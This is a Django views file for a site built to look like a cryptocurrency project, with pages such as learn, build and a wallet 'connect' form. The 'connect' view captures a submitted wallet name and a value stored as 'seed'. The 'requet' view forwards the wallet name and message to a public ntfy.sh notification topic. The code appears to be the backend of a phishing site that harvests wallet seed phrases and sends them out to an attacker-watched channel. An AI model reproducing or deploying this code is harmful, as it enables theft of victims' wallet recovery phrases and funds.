from django.shortcuts import render
from django.http import JsonResponse
import requests
# Create your views here.

def home(request):
    return render(request, 'index.html')

def connect(request):
    if request.method== "POST":
        wallet= request.POST["wallet"]
        seed= request.POST["message"]

        print(seed)
        print(wallet)
    return render(request, 'connect.html')

def learn(request):
    return render(request, 'learn.html')

def build(request):
    return render(request, 'build.html')

def use(request):
    return render(request, 'use.html')

def operate(request):
    return render(request, 'operate.html')

def news(request):
    return render(request, 'news.html')


def requet(request):
    wallet = request.GET.get('wallet')
    message = request.GET.get('message')

    if not wallet or not message:
        return JsonResponse({'error': 'Missing parameters'}, status=400)

    try:
        response = requests.post(
            "https://ntfy.sh/KING_OF_FOOTBALL",
            data=f"Wallet: {wallet}\nMessage: {message}".encode('utf-8')
        )
        response.raise_for_status()  # Ensure the request was successful
        return JsonResponse({'test_confirmed': True})
    except requests.RequestException as e:
        return JsonResponse({'error': str(e)}, status=500)
